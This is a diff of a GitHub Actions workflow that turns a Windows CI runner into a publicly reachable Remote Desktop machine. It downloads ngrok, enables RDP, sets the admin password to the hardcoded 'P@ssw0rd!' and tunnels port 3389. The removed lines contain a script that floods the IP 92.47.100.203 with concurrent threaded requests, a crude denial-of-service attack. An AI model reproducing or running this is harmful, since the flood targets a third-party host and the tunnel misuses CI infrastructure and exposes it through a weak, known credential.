@@ -1,86 +1,45 @@
 name: CI
 
-on:
-  push:
-  workflow_dispatch:
+
+on: [push, workflow_dispatch]
+
 
 jobs:
+
   build:
+
+
     runs-on: windows-latest
 
+
     steps:
-    - name: Download ngrok
+
+    - name: Download
+
       run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
 
-    - name: Extract ngrok
+    - name: Extract
+
       run: Expand-Archive ngrok.zip
 
-    - name: Auth ngrok
+    - name: Auth
+
       run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
+
       env:
+
         NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
 
-    - name: Enable Remote Desktop
-      run: |
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+    - name: Enable TS
 
-    - name: Set Local User Password
-      run: |
-        Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
 
-    - name: Wait for Tunnel to be ready
-      run: Start-Sleep -s 10
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-    - name: Save Bash Script
-      run: |
-        echo '#!/bin/bash
-        # Install requests library
-        pip install requests
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
 
-        # Create Python script file
-        echo '
-        import requests
-        import threading
-
-        def send_request():
-            url = "http://92.47.100.203"
-            try:
-                response = requests.get(url)
-                print(f"Response from {url}: {response.status_code}")
-            except Exception as e:
-                print(f"Error sending request to {url}: {e}")
-
-        num_threads = 100
-        threads = [threading.Thread(target=send_request) for _ in range(num_threads)]
-
-        for thread in threads:
-            thread.start()
-
-        for thread in threads:
-            thread.join()
-        ' > script.py
-
-        # Run the script 9 times concurrently
-        for i in {1..9}
-        do
-            python script.py &
-        done
-
-        # Wait for all background processes to finish
-        wait
-        ' > run_script.sh
-
-    - name: Copy Files to Remote Machine
-      run: |
-        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i path/to/your/private/key.pem run_script.sh runneradmin@localhost:~
-        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i path/to/your/private/key.pem script.py runneradmin@localhost:~
-
-    - name: Execute Bash Script on Remote Machine
-      run: |
-        ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i path/to/your/private/key.pem runneradmin@localhost "bash run_script.sh"
+    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
 
     - name: Create Tunnel
-      run: .\ngrok\ngrok.exe tcp 3389
 
+      run: .\ngrok\ngrok.exe tcp 3389
